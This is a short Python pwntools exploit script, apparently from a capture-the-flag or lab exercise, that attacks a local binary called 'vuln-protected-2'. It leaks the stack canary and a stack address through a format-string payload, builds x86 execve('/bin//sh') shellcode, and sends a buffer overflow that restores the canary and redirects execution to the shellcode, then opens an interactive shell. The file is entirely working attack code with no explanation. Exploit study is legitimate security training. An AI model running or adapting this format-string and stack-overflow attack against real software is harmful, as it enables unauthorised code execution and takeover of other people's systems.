#!/usr/bin/env python3

from pwn import *


p = process('./vuln-protected-2')

p.writeline("%p " * 199)

data = p.readline()
data = data.split(b" ")

#for i in range(len(data)):
#    log.info("{} {}".format(i, data[i]))

canary = int(data[154],16)
log.info("CANARY: 0x%08x" % canary)

shellcode_asm = """ 
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
"""

shellcode = asm(shellcode_asm)
buffer_len = 600
some_addres = int(data[157],16)
offset = 628
buffer_addres = some_addres - offset

log.info("BUFFER: 0x%08x" % buffer_addres)

send = shellcode + b"A"* (buffer_len - len(shellcode)) + p32(canary) + b"BBBBCCCCDDDD" + p32(buffer_addres) 
p.sendline(send)
p.interactive()




